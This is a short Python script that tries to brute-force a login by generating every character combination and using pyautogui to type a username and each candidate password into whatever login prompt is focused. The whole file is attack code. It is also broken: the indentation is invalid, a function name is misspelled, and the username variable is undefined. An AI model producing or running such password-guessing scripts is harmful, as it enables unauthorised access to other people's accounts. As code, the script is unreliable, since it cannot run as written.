import itertools
import time

import pyautogui

Alphabet = ("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890-_.!§$%&/()=?\[]{}*#'+/*")

CharLength = 1

username= hostname

for Index in range(25):
    passwords = (itertools.product(Alphabet, repeat = Index))
            for i in passwords:
            i = str(i)
            i = i.replace("[", "")
            i = i.replace("]", "")
            i = i.replace("'", "")
            i = i.replace(" ", "")
            i = i.replace(",", "")
            i = i.replace("(", "")
            i = i.replace(")", "")

            pyautogui.typewrite(username)
            pyautogui.keyDown("enter")
            pyautogui.keyUp("enter")
            pyautogui.typerwrite(i)
            pyautogui.keyDown("enter")
            pyautogui.keyUp("enter")
        Index += 1
                            

